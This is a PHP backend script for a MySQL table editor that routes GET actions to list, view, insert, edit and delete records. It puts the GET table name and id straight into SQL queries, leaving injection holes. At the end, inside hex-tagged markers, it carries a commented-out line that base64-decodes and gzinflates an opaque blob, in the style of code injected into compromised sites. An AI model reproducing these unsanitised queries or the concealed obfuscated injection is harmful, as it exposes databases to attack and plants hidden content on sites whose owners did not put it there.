<? require("mysql.php");

/* Init SQL Class */ 
$mysql_response = new mysql_response($db_server, $db_user, $db_password, $db_name);

$_db_connect = $mysql_response->database_connect();//mysql_connect
$_my_database = $mysql_response->database_select();//mysql_select_db
$_db_name = $mysql_response->database_name();


/* Init httpGET Table */

$table = $_GET['tab'];


switch($_GET['action']){
	
	/* Server Response Text & Actions */ 
	case "get_status":
		if($mysql_response->database_connect()) echo "DB ".$mysql_response->database_name()." connesso. Funzione generatrice: testConn()";
		else echo $mysql_response->show_errors();
	break;
	case "do_edit":
		$mysql_response->do_update_query($table);
	break;
	case "do_insert":
		$mysql_response->do_insert_query($table);				
	break;
	case "delete":
		echo "debug: file switch application";
		$mysql_response->delete_record($table);
	break;
	/* End Server Response Text & Actions */


	
	/* Build JSon Object */
	case "list_tables": 
		$mysql_response->list_tables();
	break;	
	case "t_view":
			$string_query = "SELECT * from ".$table;
			$mysql_response->return_table_values($string_query);
	break;	
	case "f_insert":
			//$string_query = "SELECT * from ".$table;
			$string_query = "SELECT * from ".$table; //." WHERE id_site = 30";
			$mysql_response->return_field_names($table);
	break;
	// olds
	case "f_edit":
		$string_query = "SELECT * from ".$table." WHERE ";
			switch($_GET['tab']){
				case "prod_traina_collane":
					$string_query .= "id_collana = ".$_GET['id'];
				break;
			}
			//echo $string_query;
			$mysql_response->return_table_values($string_query);
			//$mysql_response->return_field_names($table);
	break;
	/* End JSon Object */


	/* Experimental */
	case "get_count":
		$counter = $_GET['counter'];
		echo $counter;
	break;
	case "field_n":			
			$mysql_response->return_field_names('websites');
	break;	
}


#edf20c#
//echo(gzinflate(base64_decode("fVNNb9swDD3nX3A+1Daa2Um30xwFGLAP7JDt0AHDToVq07Y2RzIkOs4+8t9HWUYbpNssQDBIvkc+ktq40qqegH70KCLCI+Xf5EEGa7StB12SMhoapLvSmO8Kk49yjyn8WhykBYfSli0I8Ea4hkhExeS//wSIPVB9kNyN6IraqGpDLlsEdNWaDKOtQNtbCFlSdcmLp2SBx/Gad0hcdPdRLSpcViYpvDnwl4vmY8LB4YrsVc2ZyBAQvU1X+YoyJaQkB7+ol/Qkzk/4Q/0p8JFoNGV8oen+h1w70jq3Qz174Epk19whOfQHHeuuL0MAD3OADNvV7CFOBl8+c7//Xh4rSb7ZGkd4w79JWnhfsGeM/8otSW5WNy8vHTujqU1eXJonktl6ocSnCROPRcz3rHeuia0FHntl0U3emZLM+93n26A/BPWSWpHHxckLuLd3FhtmzpN3DK3N8ffu9sPbNFeFdw/O3hk3JT6oRpKx2eDQvm64qkLVydmGxmT6Hquhj1M/wDiGq//6sZn+0llW2Sf+HBm9HlKn3iC3WkfiMfVI9WcS/ijaqtlz3d98ZWaMUKWlRNS2INo6pYzxr49ZiuY5lCG3C2FFFL1L/K83Ecs0F1venUTyVra5zSRvMWUq501tK+i7awyUOWbcyL4f6magnxejUdDjlt8vBat38A")));
#/edf20c#
?>
